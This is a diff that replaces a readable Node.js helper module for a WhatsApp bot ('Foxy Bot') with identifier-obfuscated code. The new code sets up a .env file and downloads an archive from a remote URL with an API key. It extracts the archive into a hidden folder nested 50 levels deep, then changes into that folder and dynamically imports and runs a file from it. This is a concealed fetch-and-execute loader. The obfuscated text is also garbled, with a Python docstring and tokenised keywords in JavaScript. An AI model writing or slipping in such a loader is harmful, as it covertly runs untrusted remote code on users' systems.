@@ -1,132 +1,157 @@
-'use strict';
+"""
+Obfuscated by Davex Obfuscator
+Author: Dave Tech
+Date: 2026-07-09 07:16:22 UTC
+Protection: Hard
+Tool: https://github.com/Davex-254/davex-obfuscator
+"""
 
-const fs   = require('fs');
-const path = require('path');
-const cp   = require('child_process');
+import '_0000_/_0001_';
+import _0002_ from '_0002_';
+import _0003_ from '_0003_';
+import { _0004_ } from '_0005_';
+import _0006_ from '_0006_';
+import _0007_ from '_0008_-_0009_';
+import _000a_ from '_000a_';
 
-const _BK       = path.join(__dirname, '.bkp');
-const _MAX_FILE = 20 * 1024 * 1024;
+// ========== _000b_ _000c_ _000d_ _000e_ ==========
+_000f_ _000g_ = _0004_(import._000h_._0005_);
+_000f_ _000c_ = _0003_._000i_(_000g_);
 
-const _SKIP_DIRS = new Set([
-  'node_modules', 'commands', 'bin', 'scripts', 'lib',
-]);
-const _SKIP_EXT = new Set([
-  '.js', '.cjs', '.mjs', '.md', '.html', '.sql', '.toml',
-  '.lock', '.yml', '.yaml',
-]);
-const _SKIP_FILES = new Set([
-  'package.json', 'package-lock.json', 'Procfile', 'app.json',
-  'railway.json', 'heroku.yml', 'nixpacks.toml', 'egg-nodejs-wolfbot.json',
-  'deploy.html', 'README.md', 'READme.md', 'replit.md',
-  'supabase_setup.sql', '.gitignore', '.npmrc', '.replit', '.slugignore',
-]);
+// ========== _000j_ _000k_ _000l_ ==========
+_000f_ _000m_ = _0003_._000n_(_000c_, "._000o_");
 
-const _O  = '\x1b[1m\x1b[38;2;255;102;0m';
-const _Y  = '\x1b[38;2;255;165;50m';
-const _W  = '\x1b[38;2;200;215;225m';
-const _DM = '\x1b[2m\x1b[38;2;100;120;130m';
-const _R  = '\x1b[0m';
-
-function printBanner() {
-  console.log('');
-  console.log(_O + '    🦊  F O X Y   B O T  🦊' + _R);
-  console.log(_Y + '    ─────────────────────────' + _R);
-  console.log(_W + '    Settings Guardian Active' + _R);
-  console.log(_DM + '    Protecting your config across restarts...' + _R);
-  console.log('');
-}
-
-function _cpFile(src, dst) {
-  try {
-    if (fs.statSync(src).size > _MAX_FILE) return;
-    fs.mkdirSync(path.dirname(dst), { recursive: true });
-    fs.copyFileSync(src, dst);
-  } catch (_) {}
-}
-
-function _cpDir(src, dst) {
-  try {
-    for (const e of fs.readdirSync(src, { withFileTypes: true })) {
-      if (e.name.endsWith('-shm') || e.name.endsWith('-wal')) continue;
-      const s = path.join(src, e.name);
-      const d = path.join(dst, e.name);
-      if (e.isDirectory()) _cpDir(s, d);
-      else _cpFile(s, d);
+_000p_ _000q_() {
+  if (!_0002_._000r_(_000m_)) {
+    _000s_._000t_(`[_000u_] _000v_ _000w_'_000x_ _000y_ ._000o_ _000z_, _0010_ _0011_...`);
+    try {
+      _0002_._0012_(
+        _000m_,
+        "# _0013_-_0014_ ._000o_ _000z_\_0015_=\_0016_"
+      );
+    } _0017_ (_0018_) {
+      _000s_._0019_(`[_001a_] _001b_ _001c_ _001d_ ._000o_ _000z_: ${_0018_._001e_}`);
+      return;
     }
-  } catch (_) {}
-}
+  }
 
-function backupSettings(dir) {
-  if (!dir || !fs.existsSync(dir)) return;
   try {
-    fs.rmSync(_BK, { recursive: true, force: true });
-  } catch (_) {}
-  fs.mkdirSync(_BK, { recursive: true });
-  try {
-    for (const e of fs.readdirSync(dir, { withFileTypes: true })) {
-      const name = e.name;
-      if (e.isDirectory()) {
-        if (_SKIP_DIRS.has(name) || name.startsWith('.')) continue;
-        _cpDir(path.join(dir, name), path.join(_BK, name));
-      } else {
-        const ext = path.extname(name).toLowerCase();
-        if (_SKIP_EXT.has(ext) || _SKIP_FILES.has(name) || name.startsWith('.')) continue;
-        _cpFile(path.join(dir, name), path.join(_BK, name));
-      }
-    }
-    console.log(_DM + '    [FOXY] Settings backed up' + _R);
-  } catch (_) {}
-}
-
-function restoreSettings(dir) {
-  if (!fs.existsSync(_BK)) return;
-  _cpDir(_BK, dir);
-  console.log(_DM + '    [FOXY] Settings restored to bot directory' + _R);
-}
-
-function fixBaileys(dir) {
-  try {
-    const pkgPath = path.join(dir, 'node_modules', '@whiskeysockets', 'baileys', 'package.json');
-    if (!fs.existsSync(pkgPath)) return;
-    const pkg = JSON.parse(fs.readFileSync(pkgPath, 'utf8'));
-    let changed = false;
-    if (pkg.exports && typeof pkg.exports === 'object') {
-      for (const [key, val] of Object.entries(pkg.exports)) {
-        if (val && typeof val === 'object' && val.import && !val.default) {
-          pkg.exports[key] = { ...val, default: val.import };
-          changed = true;
+    _000f_ _001f_ = _0002_._001g_(_000m_, '_001h_');
+    _000f_ _001i_ = _001f_._001j_('\_0016_');
+    
+    _001i_._001k_(_001l_ => {
+      _000f_ _001m_ = _001l_._001n_();
+      if (!_001m_ || _001m_._001o_('#')) return;
+      
+      _000f_ _001p_ = _001m_._001q_('=');
+      if (_001p_ !== -1) {
+        _000f_ _001r_ = _001m_._001s_(0, _001p_)._001n_();
+        _000f_ _001t_ = _001m_._001s_(_001p_ + 1)._001n_();
+        _000f_ _001u_ = _001t_._001v_(/^['"](.*)['"]$/, '$1');
+        
+        if (!_001w_._000o_[_001r_]) {
+          _001w_._000o_[_001r_] = _001u_;
+          _000s_._000t_(`[_000j_] _001x_ _001y_...`);
         }
       }
-    }
-    if (!pkg.main || !fs.existsSync(path.join(dir, 'node_modules', '@whiskeysockets', 'baileys', pkg.main.replace(/^\.\//, '')))) {
-      for (const c of ['lib/index.js', 'src/index.js', 'index.js']) {
-        if (fs.existsSync(path.join(dir, 'node_modules', '@whiskeysockets', 'baileys', c))) {
-          pkg.main = './' + c;
-          changed = true;
-          break;
-        }
-      }
-    }
-    if (changed) {
-      fs.writeFileSync(pkgPath, JSON.stringify(pkg));
-      console.log(_DM + '    [FOXY] Patched baileys package.json' + _R);
-    }
-  } catch (_) {}
+    });
+    
+    _000s_._000t_("[ _000j_ ] _000z_ _001z_ _0020_");
+  } _0017_ (_0018_) {
+    _000s_._0019_("[ _001a_ ] _001b_ _001c_ _0021_ ._000o_ _000z_:", _0018_._001e_);
+  }
 }
 
-function patchSpawn() {
-  const _orig = cp.spawn.bind(cp);
-  cp.spawn = function (cmd, args, opts) {
-    if (
-      (cmd === 'npm' || cmd === 'npm.cmd') &&
-      Array.isArray(args) &&
-      args.includes('install') &&
-      !args.includes('--ignore-scripts')
-    ) {
-      args = [...args, '--ignore-scripts'];
-    }
-    return _orig(cmd, args, opts);
-  };
+// === _0022_ _0023_ _0024_ ===
+_000p_ _0025_() {
+  if (_001w_._000o_._0024_) {
+    _000s_._000t_(`[ _0026_ ] _0027_ in _000o_ _000z_...`);
+    return _0028_;
+  } else {
+    _000s_._000t_("[ _0029_ ] _002a_ _002b_ _000o_.");
+    return _002c_;
+  }
 }
 
-module.exports = { printBanner, backupSettings, restoreSettings, fixBaileys, patchSpawn };
+// ========== _002d_ _002e_ _002f_ ==========
+// === _002g_ ===
+_000f_ _002h_ = _001w_._000o_._002h_ || '_002i_://_002j_-_002k_-_002l_._002m_._002n_/_002o_/_002p_';
+_000f_ _002q_ = _001w_._000o_._002q_ || '1234567-_002r_';
+
+_000f_ _002s_ = _0003_._000n_(_000c_, '_002t_', '_002u_');
+_000f_ _002v_ = 50;
+
+// === _002w_ 1: _002x_ _002y_ _002z_ _0030_
+_000p_ _0031_() {
+  _0032_ _0033_ = _002s_;
+  for (_0032_ _0034_ = 0; _0034_ < _002v_; _0034_++) {
+    _0033_ = _0003_._000n_(_0033_, `_0035_${_0034_}`);
+  }
+  _000f_ _0036_ = _0003_._000n_(_0033_, '_0037_');
+  _0002_._0038_(_0036_, { _0039_: _0028_ });
+  return _0036_;
+}
+
+// === _002w_ 2: _003a_ _003b_ from _003c_ _003d_
+async _000p_ _003e_(_0036_) {
+  try {
+    _000s_._000t_('[ _003f_ ] from _003g_ _003d_...');
+
+    _000f_ _003h_ = await _0006_._003i_(_002h_, {
+      _003j_: '_003k_',
+      _003l_: {
+        '_003m_-_003n_-_001r_': _002q_,
+        '_003o_-_003p_': '_003q_ _003r_-_003s_-_003t_'
+      },
+      _003u_: 20000
+    });
+
+    _000f_ _0009_ = _003v_ _0007_(_003w_.from(_003h_._003x_));
+    _0009_._003y_(_0036_, _0028_);
+
+    _000s_._000t_('✅ _003z_ _0040_ _0020_');
+  } _0017_ (_0041_) {
+    _000s_._0019_('❌ _0042_ _0043_:', _0041_._003h_?._0044_ || _0041_._001e_);
+    _001w_._0045_(1);
+  }
+}
+
+// === _002w_ 3: _0046_ _0047_ (_0048_ - _0049_ ._000o_ _004a_ _004b_ _004c_)
+_000p_ _004d_(_004e_) {
+  _000f_ _004f_ = _0003_._000n_(_000c_, '_004g_._004h_');
+
+  try {
+    if (_0002_._000r_(_004f_)) {
+      _0002_._004i_(_004f_, _0003_._000n_(_004e_, '_004g_._004h_'));
+    }
+  } _0017_ {}
+}
+
+// === _002w_ 4: _004j_ _004k_ _004l_ _004m_ (_004n_-_004o_ await)
+try {
+  // _004p_ ._000o_ _000z_ _004q_
+  _000q_();
+  _0025_();
+  
+  _000f_ _0036_ = _0031_();
+  await _003e_(_0036_);
+
+  _000f_ _004r_ = _0002_
+    ._004s_(_0036_)
+    ._004t_(_004u_ => _0002_._004v_(_0003_._000n_(_0036_, _004u_))._004w_());
+
+  if (!_004r_._004x_) {
+    _000s_._0019_('❌ _003b_ _004y_ _004z_');
+    _001w_._0045_(1);
+  }
+
+  _000f_ _0050_ = _0003_._000n_(_0036_, _004r_[0]);
+  _004d_(_0050_);
+
+  _000s_._000t_('[ _0051_ ] _0052_ _0053_....');
+  _001w_._0054_(_0050_);
+  await import(_0003_._000n_(_0050_, '_0055_._004h_'));
+} _0017_ (_0041_) {
+  _000s_._0019_('❌ _004m_ _0056_ _0019_. _0057_ _0058_ _0059_ _005a_ _005b_.');
+  _001w_._0045_(1);
+}
